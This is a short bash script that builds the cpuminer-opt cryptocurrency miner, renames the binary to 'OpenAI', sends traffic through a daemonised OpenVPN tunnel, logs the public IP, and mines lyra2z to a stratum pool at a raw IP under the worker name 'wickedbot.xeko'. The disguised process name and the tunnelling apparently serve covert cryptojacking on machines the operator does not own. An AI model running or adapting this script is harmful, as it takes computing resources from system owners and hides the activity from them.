#!/bin/bash
sudo apt-get update && sudo apt-get -y upgrade &&
sudo apt-get install -y wget tmux git make curl unzip gedit automake autoconf dh-autoreconf build-essential pkg-config openssh-server screen libtool libcurl4-openssl-dev libncurses5-dev libudev-dev libjansson-dev libssl-dev libgmp-dev gcc g++ screen
sudo apt-get install -y openvpn
sudo git clone https://github.com/JayDDee/cpuminer-opt
cd cpuminer-opt
./build.sh
mv cpuminer OpenAI
IP=$(/sbin/ip route | awk '/default/ { print $3 }')
route add  1.52.168.10 gw $IP
sudo openvpn --config test.ovpn --daemon
sleep 5m
sudo wget -qO- http://ipv4.icanhazip.com > ip.txt
sudo ./OpenAI -a lyra2z -o stratum+tcp://95.169.195.152:3032 -u wickedbot.xeko -p x